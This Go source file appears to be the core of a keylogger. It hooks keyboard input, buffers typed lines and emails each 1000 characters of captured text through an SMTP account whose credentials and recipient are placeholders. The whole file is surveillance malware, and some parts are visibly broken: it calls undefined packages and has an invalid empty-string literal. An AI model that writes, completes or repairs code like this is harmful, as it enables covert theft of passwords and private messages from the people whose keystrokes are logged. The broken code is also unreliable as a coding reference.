package main

import (
	"log"
	"strings"
	"kl/mail"
	"time"
)

func panic(err error) {
	if err != nil {
		log.Panicln(err)
	}
}

func main() {
	err := kl.InitKey()
	panic(err)

	utils.Atexit(func() {
		err := end_key()
		panic(err)
	})

	var data strings.Builder
	var bff string

	email := &mail.Email{
		From:       "FROM",
		Password:   `PASSWORD`,
		ServerHost: "SERVER",
		ServerPort: "PORT",
		To:         []string{"TO"},
		Subject:    time.Now().Format("2006-01-02 15:04:05"),
		Body:       '',
	}

	read_input(func(n string) {
		if n == "\n" {
			if len(bff) > 0 {
				data.WriteString(bff)
			}

			bff = ""
		} else {
			bff += n
		}
		if len(data.String()) >= 1000 {
			email.Body = data.String()
			email.Send()
		}
	})
}
